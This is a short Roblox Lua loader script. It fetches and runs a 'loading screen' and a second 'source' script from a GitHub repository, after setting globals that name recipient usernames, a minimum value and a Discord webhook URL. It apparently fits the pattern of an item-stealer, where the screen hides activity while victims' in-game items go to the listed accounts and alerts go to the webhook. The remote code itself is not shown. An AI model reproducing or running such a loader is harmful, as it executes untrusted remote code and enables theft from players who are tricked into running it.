-- STEP 1: Load the GUI loader (loading screen)
loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()

-- STEP 2: Wait for GUI to fully show (so it's not skipped)
task.wait(2)

-- STEP 3: Set globals for the source script
_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"}
_G.min_value = 0.1
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr"

-- STEP 4: Load and run the actual script
loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
